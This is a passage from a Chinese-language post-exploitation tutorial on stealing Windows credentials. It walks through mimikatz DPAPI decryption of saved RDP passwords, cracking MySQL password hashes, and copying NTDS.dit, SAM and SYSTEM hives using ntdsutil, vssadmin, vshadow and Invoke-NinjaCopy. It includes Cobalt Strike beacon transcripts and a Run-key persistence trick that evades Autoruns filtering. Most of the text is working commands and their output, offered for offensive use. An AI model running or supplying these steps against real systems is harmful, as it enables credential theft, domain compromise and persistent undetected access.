class="line">AAAD88ECA44F5AAA1754B5E18F7EB12D</span><br><span class="line">DFBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line">E05DBE15D38053457F3523A375594044</span><br></pre></td></tr></table></figure><ul><li>查看保存在本地的远程主机信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure><ul><li>选择一个密码文件对其进行解密。</li></ul><p>此处需要记录下 guidMasterKey 的值，待会要通过 guidMasterKey 找对应的 Masterkey 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guidMasterKey      : &#123;34dc48bb-0af9-4925-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207311118273.png" alt="image-20220729082150066"></p><ul><li>根据 guidMasterKey  找到对应的 Masterkey</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290823475.png" alt="image-20220729082254297"></p><ul><li>通过 Masterkey 解密 pbData 数据，拿到明文 RDP 连接密码</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266 </span><br><span class="line">/masterkey:f391aa638da6b6d846685f84660ee638bd6d3122214de34285b4dd3bd827a5c3925c5bd7a448c175457c19b2556c9f6f5248ef9256060a5b74c1264d3a5a99f8</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290824301.png" alt="image-20220729082414076"></p><h4 id="netpass"><a href="#netpass" class="headerlink" title="netpass"></a>netpass</h4><blockquote><p><a href="https://www.nirsoft.net/x64_download_package.html">https://www.nirsoft.net/x64_download_package.html</a><br><a href="https://www.nirsoft.net/packages/x64tools.zip">https://www.nirsoft.net/packages/x64tools.zip</a>     nirsoft123!</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290824401.png" alt="image-20220729082451257"></p><h4 id="Powershell脚本获取RDP连接记录"><a href="#Powershell脚本获取RDP连接记录" class="headerlink" title="Powershell脚本获取RDP连接记录"></a>Powershell脚本获取RDP连接记录</h4><blockquote><p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040700775.png" alt="image-20220804070000501"></p><h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line">[*] Tasked beacon to run: reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line">[+] host called home, sent: 113 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\10.10.10.6    UsernameHint    REG_SZ    MINGY\Administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">[*] Tasked beacon to run: dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">[+] host called home, sent: 89 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C883-5B4B</span><br><span class="line"> C:\Users\Administrator\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line">2020/09/04  13:24    &lt;DIR&gt;          .</span><br><span class="line">2020/09/04  13:24    &lt;DIR&gt;          ..</span><br><span class="line">2020/09/04  13:24               434 8CAC243098BA9DDD4EAB58433B85D7F0</span><br><span class="line">   1 个文件            434 字节</span><br><span class="line">               2 个目录 56,959,107,072 可用字节</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell cmdkey /list</span><br><span class="line">[*] Tasked beacon to run: cmdkey /list</span><br><span class="line">[+] host called home, sent: 43 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">当前保存的凭据:</span><br><span class="line">    目标: Domain:target=TERMSRV/10.10.10.6</span><br><span class="line">    类型: 域密码</span><br><span class="line">    用户: WIN7-1\administrator</span><br><span class="line">    本地机器持续时间</span><br><span class="line">    </span><br><span class="line">    目标: LegacyGeneric:target=MINGY\WIN7-1</span><br><span class="line">    类型: 普通 </span><br><span class="line">    用户: MINGY\WIN7-1</span><br><span class="line">    </span><br><span class="line">    目标: LegacyGeneric:target=WIN7-1\Administrator</span><br><span class="line">    类型: 普通 </span><br><span class="line">    用户: WIN7-1\Administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\8CAC243098BA9DDD4EAB58433</span><br><span class="line">B85D7F0&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h3 id="2-Mysql数据库密码破解"><a href="#2-Mysql数据库密码破解" class="headerlink" title="2 Mysql数据库密码破解"></a>2 Mysql数据库密码破解</h3><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。<br>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权限后即可直接从数据库连接文件中读取<br>一般都包含有<strong>数据库类型，物理位置，用户名和密码</strong>等信息</p><h4 id="1、MYSQL数据库文件类型"><a href="#1、MYSQL数据库文件类型" class="headerlink" title="1、MYSQL数据库文件类型"></a>1、MYSQL数据库文件类型</h4><p>MYSQL数据库文件共有 frm 、 MYD 和 MYI 三种文件</p><ul><li>“.frm” 是描述表结构的文件</li><li>“.MYD” 是表的数据文件</li><li>“.MYI” 是表数据文件中任何索引的数据树</li></ul><p>一般是单独存在一个文件夹中<br>与用户有关的一共有三个文件即 user.frm 、 user.MYD 和 user.MYI ，MYSQL数据库用户密码都保存在 user.MYD 文件中，包括root用户和其他用户的密码。</p><h4 id="2、Mysql加密方式"><a href="#2、Mysql加密方式" class="headerlink" title="2、Mysql加密方式"></a>2、Mysql加密方式</h4><p>MYSQL数据库的认证密码有两种方式<br>MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密<br>MYSQL数据库中自带 Old_Password(str)  和 Password(str) 函数,它们均可以在MYSQL数据库里进行查询，前者是 MYSQL323 加密，后者是 MYSQLSHA1 方式加密。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select Password(&#x27;root&#x27;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| Password(&#x27;root&#x27;)                          |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>MYSQL323 加密中生成的是16位字符串，而在 MYSQLSHA1 中生成的是41位字符串，其中 * 是不加入实际的密码运算中， MYSQLSHA1 加密的密码的实际位数是40位</p><h4 id="3、获取Mysql数据库密码hash值"><a href="#3、获取Mysql数据库密码hash值" class="headerlink" title="3、获取Mysql数据库密码hash值"></a>3、获取Mysql数据库密码hash值</h4><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040710562.png" alt="image-20220804071007319"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><h4 id="4、Hash破解"><a href="#4、Hash破解" class="headerlink" title="4、Hash破解"></a>4、Hash破解</h4><ul><li>在线网站破解</li></ul><blockquote><p><a href="http://www.cmd5.com/">www.cmd5.com</a><br><a href="http://www.somd5.com/">www.somd5.com</a></p></blockquote><ul><li>hashcat破解</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat.exe -m 300 -a 3 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040711282.png" alt="image-20220804071121105"></p><ul><li>john the ripper破解</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --list=format | grep mysql</span><br><span class="line">john --format=mysql-sha1 mysql.hash</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040712296.png" alt="image-20220804071203110"></p><ul><li>Cain破解</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040712139.png" alt="image-20220804071219948"></p><h3 id="3-其他应用程序密码破解"><a href="#3-其他应用程序密码破解" class="headerlink" title="3 其他应用程序密码破解"></a>3 其他应用程序密码破解</h3><blockquote><p><a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p></blockquote><p>对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。</p><blockquote><p>源码：<a href="https://github.com/RowTeam/SharpDecryptPwd">https://github.com/RowTeam/SharpDecryptPwd</a></p></blockquote><h1 id="域内密码凭证获取"><a href="#域内密码凭证获取" class="headerlink" title="域内密码凭证获取"></a>域内密码凭证获取</h1><h2 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h2><p><strong>活动目录数据库（NTDS.DIT）</strong><br>Ntds.dit 是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在 SYSTEM 注册表配置单元中的密钥对这些哈希值进行加密。第二个加密步骤是为了执行密码转储以进行审计，需要两个文件的副本。<br>非域环境也就是在工作组环境中，有一个sam文件存储着当前主机用户的密码信息，想要破解sam文件与ntds.dit文件都需要拥有一个system文件。<br><strong>AD DS 数据存储：</strong></p><ul><li>由 Ntds.dit 文件构成</li><li>默认存储在所有域控制器上的 %SystemRoot%\NTDS  文件夹中</li><li>只能通过域控制器进程和协议访问</li></ul><p><strong>Ntds.dit：</strong>(也被称为Active Directory database)包含了当前域中所有的用户的账号信息，和其HASH值通过获取 Ntds.dit 和 SYSTEM 文件的副本，最可靠的执行密码审计的方法是脱机的。</p><p>由于Windows阻止这些操作阻止标准读取或复制，因此必须使用特殊技术来获取副本。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntds.dit文件位置: C:\Windows\NTDS\NTDS.dit</span><br><span class="line">system文件位置:C:\Windows\System32\config\SYSTEM</span><br><span class="line">sam文件位置:C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure><h2 id="1-活动目录数据库"><a href="#1-活动目录数据库" class="headerlink" title="1 活动目录数据库"></a>1 活动目录数据库</h2><ul><li>由 NTDS.DIT 文件构成，是Active Directory的核心</li><li>存储在域控的 %SystemRoot%\ntds\  文件夹下</li><li>只能通过域控制器进程和协议访问</li></ul><p><strong>在工作组环境中，SAM文件存储着当前主机用户的密码哈希值</strong><br><strong>在域环境中，NTDS.DIT文件存储了域中所有用户的密码哈希值</strong><br>因此我们可以通过获取到这两个文件，然后破解得到其中所存储的密码哈希值。<br>Windows系统为了进一步保护存储的密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。<br>因此想要破解SAM文件与NTDS.DIT文件都需要获取一个SYSTEM文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTDS.DIT文件位置：%SystemRoot%\NTDS\NTDS.dit</span><br><span class="line">SYSTEM文件位置：%SystemRoot%\System32\config\SYSTEM</span><br><span class="line">SAM文件位置：%SystemRoot%\System32\config\SAM</span><br></pre></td></tr></table></figure><p>由于Window会阻止对这些文件的标准读取或复制操作，如果直接去复制NTDS.DIT文件，会提示文件被系统占用，所以常规的复制下载方法是无法获取到文件副本的，因此需要通过特殊方法来获取。</p><h2 id="2-Volume-Shadow-Copy"><a href="#2-Volume-Shadow-Copy" class="headerlink" title="2 Volume Shadow Copy"></a>2 Volume Shadow Copy</h2><p><strong>Volume Shadow Copy Service</strong><br>Volume Shadow Copy Service  卷影复制服务（VSS）是微软从 Windows XP  开始提供的用于创建一致性的时间点副本（也就是快照）的服务框架。用于更好的备份和还原关键业务数据。当所有组件都支持VSS时，可以使用它们来备份应用程序数据，而无需使应用程序脱机。</p><ul><li>用于数据备份</li><li>支持 Windows Server 2003  及以上操作系统</li><li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li><li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li></ul><p>我们可以利用 Volume Shadow Copy Service 来获取 NTDS.DIT、SAM、SYSTEM 等文件副本。<br>注意：</p><ol><li>调用 Volume Shadow Copy 服务会产生SYSTEM日志， Event ID 为7036。</li><li>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 Event ID 为 98 的日志</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hash数量：所有用户</span><br><span class="line">免杀：不需要</span><br><span class="line">优点：</span><br><span class="line">    获得信息全面</span><br><span class="line">    简单高效</span><br><span class="line">    无需下载ntds.dit，隐蔽性高</span><br></pre></td></tr></table></figure><h2 id="3-Ntdsutil"><a href="#3-Ntdsutil" class="headerlink" title="3 Ntdsutil"></a>3 Ntdsutil</h2><p>域环境默认安装<br>支持系统：</p><ul><li>Server 2003</li><li>Server 2008</li><li>Server 2012</li></ul><h3 id="3-1-交互式"><a href="#3-1-交互式" class="headerlink" title="3.1 交互式"></a>3.1 交互式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line">mount [GUID]</span><br><span class="line">//copy 完之后再执行</span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040719549.png" alt="image-20220804071927342"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040719775.png" alt="image-20220804071938619"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040719294.png" alt="image-20220804071949087"></p><ol><li>以管理员身份打开命令提示符（cmd.exe）</li><li>在命令提示符输入 ntdsutil 命令</li><li>在 ntdsutil 提示符下输入</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Drive&gt;:\&lt;Folder&gt; 是要创建文件的文件夹路径。</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040720593.png" alt="image-20220804072020376"></p><h3 id="3-2-非交互"><a href="#3-2-非交互" class="headerlink" title="3.2 非交互"></a>3.2 非交互</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><h4 id="3-2-1-查询当前系统的快照"><a href="#3-2-1-查询当前系统的快照" class="headerlink" title="3.2.1 查询当前系统的快照"></a>3.2.1 查询当前系统的快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;List Mounted&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040720421.png" alt="image-20220804072052287"></p><h4 id="3-2-2-创建快照"><a href="#3-2-2-创建快照" class="headerlink" title="3.2.2 创建快照"></a>3.2.2 创建快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040721849.png" alt="image-20220804072112660"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guid为 &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-3-挂载快照"><a href="#3-2-3-挂载快照" class="headerlink" title="3.2.3 挂载快照"></a>3.2.3 挂载快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>快照挂载为 C:$SNAP_201908291617_VOLUMEC$\</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040721812.png" alt="image-20220804072151667"></p><h4 id="3-2-4-复制ntds-dit"><a href="#3-2-4-复制ntds-dit" class="headerlink" title="3.2.4 复制ntds.dit"></a>3.2.4 复制ntds.dit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy C:\$SNAP_202008271744_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds2.dit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040722571.png" alt="image-20220804072211398"></p><h4 id="3-2-5-卸载快照"><a href="#3-2-5-卸载快照" class="headerlink" title="3.2.5 卸载快照"></a>3.2.5 卸载快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;unmount &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040722305.png" alt="image-20220804072231121"></p><h4 id="3-2-6-删除快照"><a href="#3-2-6-删除快照" class="headerlink" title="3.2.6 删除快照"></a>3.2.6 删除快照</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;delete &#123;daee5123-b284-47fe-b02e-6e67e8d80fb1&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040722860.png" alt="image-20220804072249699"></p><h2 id="4-Vssadmin"><a href="#4-Vssadmin" class="headerlink" title="4 Vssadmin"></a>4 Vssadmin</h2><p>域环境默认安装<br>支持系统：</p><ul><li>Server 2008</li><li>Server 2012</li></ul><h3 id="4-1-查询当前系统的快照"><a href="#4-1-查询当前系统的快照" class="headerlink" title="4.1 查询当前系统的快照"></a>4.1 查询当前系统的快照</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure><h3 id="4-2-创建快照"><a href="#4-2-创建快照" class="headerlink" title="4.2 创建快照"></a>4.2 创建快照</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure><p>获得 Shadow Copy Volume Name 为 \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040723275.png" alt="image-20220804072326126"></p><h3 id="4-3-复制ntds-dit"><a href="#4-3-复制ntds-dit" class="headerlink" title="4.3 复制ntds.dit"></a>4.3 复制ntds.dit</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds3.dit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040723761.png" alt="image-20220804072350593"></p><h3 id="4-4-删除快照"><a href="#4-4-删除快照" class="headerlink" title="4.4 删除快照"></a>4.4 删除快照</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quie</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040724743.png" alt="image-20220804072405555"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040724436.png" alt="image-20220804072457242"></p><h2 id="5-Vshadow"><a href="#5-Vshadow" class="headerlink" title="5 Vshadow"></a>5 Vshadow</h2><p>Vshadow ( vshadow.exe ) 是用于管理卷影副本的命令行实用程序。此工具包含在 Microsoft Windows Software Development Kit (SDK)  中，有 Microsoft 签名。</p><p>Vshadow 有很多功能，包括执行脚本和调用命令以支持卷影快照管理的能力。</p><h3 id="5-1-查询当前系统的快照"><a href="#5-1-查询当前系统的快照" class="headerlink" title="5.1 查询当前系统的快照"></a>5.1 查询当前系统的快照</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -q</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040725591.png" alt="image-20220804072537418"></p><h3 id="5-2-创建快照"><a href="#5-2-创建快照" class="headerlink" title="5.2 创建快照"></a>5.2 创建快照</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -p -nw C:</span><br><span class="line">参数说明：</span><br><span class="line">-p persistent，备份操作或是重启系统不会删除</span><br><span class="line">-nw no writers，用来提高创建速度</span><br><span class="line">C: 对应c盘</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040726784.png" alt="image-20220804072600524"></p><p>获得SnapshotSetID、SnapshotID、Shadow copy device name</p><h3 id="5-3-复制ntds-dit"><a href="#5-3-复制ntds-dit" class="headerlink" title="5.3 复制ntds.dit"></a>5.3 复制ntds.dit</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy [Shadow copy device name]\windows\ntds\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040726109.png" alt="image-20220804072636979"></p><h3 id="5-4-删除快照"><a href="#5-4-删除快照" class="headerlink" title="5.4 删除快照"></a>5.4 删除快照</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow -dx=ShadowCopySetId</span><br><span class="line">vshadow -ds=ShadowCopyId</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040726873.png" alt="image-20220804072653711"></p><h3 id="5-5-利用vshadow执行命令"><a href="#5-5-利用vshadow执行命令" class="headerlink" title="5.5 利用vshadow执行命令"></a>5.5 利用vshadow执行命令</h3><blockquote><p>参考：<a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</a></p></blockquote><p>Vshadow.exe  支持 -exec 参数，可用于执行二进制文件（.exe）或脚本（.bat&#x2F;.cmd）。<br>-exec 参数不支持命令参数</p><p>要求：</p><ul><li>管理员权限</li><li>上传 Vshadow.exe</li><li>上传攻击载荷</li></ul><p>执行命令格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vshadow.exe -nw -exec=&lt;\path\to\exe&gt; &lt;系统驱动器&gt;</span><br></pre></td></tr></table></figure><p>-nw：允许我们在不调用卷影副本编写器的情况下创建卷影副本，实际上，这是一个非持久性卷影副本，不会留下“物理”磁盘证据<br>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:</span><br><span class="line">[*] Tasked beacon to run: vshadow.exe -nw -exec=c:\windows\system32\notepad.exe </span><br><span class="line">c:</span><br><span class="line">[+] host called home, sent: 87 bytes</span><br></pre></td></tr></table></figure><p>成功执行 Vshadow 将启动卷影服务 (VSS)，如系统事件 ID 7036 所示，并调用 VSSVC.exe 进程。<br>执行后，后台存在进程 VSSVC.exe ，同时显示服务 Volume Shadow Copy 正在运行，需要手动关闭进程 VSSVC.exe</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040728040.png" alt="image-20220804072844836"></p><p>注：手动关闭进程 VSSVC.exe 会生成日志 7034</p><h3 id="5-6-自启动持久化和规避"><a href="#5-6-自启动持久化和规避" class="headerlink" title="5.6 自启动持久化和规避"></a>5.6 自启动持久化和规避</h3><p>利用思路：<br>vshadow.exe 包含微软签名，能绕过某些白名单的限制。如果作为启动项，Autoruns的默认启动列表不显示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v VSSBackup /t </span><br><span class="line">REG_EXPAND_SZ /d &quot;C:\Program Files (x86)\Windows Kits\10\bin\10.0.16299.0\x64\vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:&quot;</span><br></pre></td></tr></table></figure><p>在 AutoRuns 中，当过滤“Microsoft Entries”时，我们将看不到我们的登录条目<br>但是，如果我们取消选择“Microsoft Entries”并启用“Windows Entries”，我们将看到我们的持久性机制的记录</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040730817.png" alt="image-20220804073030521"></p><h2 id="6-NinjaCopy"><a href="#6-NinjaCopy" class="headerlink" title="6 NinjaCopy"></a>6 NinjaCopy</h2><blockquote><p>下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\invoke-NinjaCopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\Administrator\Desktop\ntds.dit&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; powershell-import C:\Users\MINGY\Desktop\Invoke-NinjaCopy.ps1</span><br><span class="line">[*] Tasked beacon to import: C:\Users\MINGY\Desktop\Invoke-NinjaCopy.ps1</span><br><span class="line">[+] host called home, sent: 206740 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination c:\sam.hive</span><br><span class="line">[*] Tasked beacon to run: Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination c:\sam.hive</span><br><span class="line">[+] host called home, sent: 493 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination c:\system.hive</span><br><span class="line">[*] Tasked beacon to run: Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination c:\system.hive</span><br><span class="line">[+] host called home, sent: 509 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination C:\ntds.dit</span><br><span class="line">[*] Tasked beacon to run: Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination C:\ntds.dit</span><br><span class="line">[+] host called home, sent: 481 bytes</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040732120.png" alt="image-20220804073215840"></p><h2 id="7-解密NTDS-DIT文件"><a href="#7-解密NTDS-DIT文件" class="headerlink" title="7 解密NTDS.DIT文件"></a>7 解密NTDS.DIT文件</h2><h3 id="7-1-Mimikatz在线破解"><a href="#7-1-Mimikatz在线破解" class="headerlink" title="7.1 Mimikatz在线破解"></a>7.1 Mimikatz在线破解</h3><p>在线破解，不用将域控上的 ntds.dit 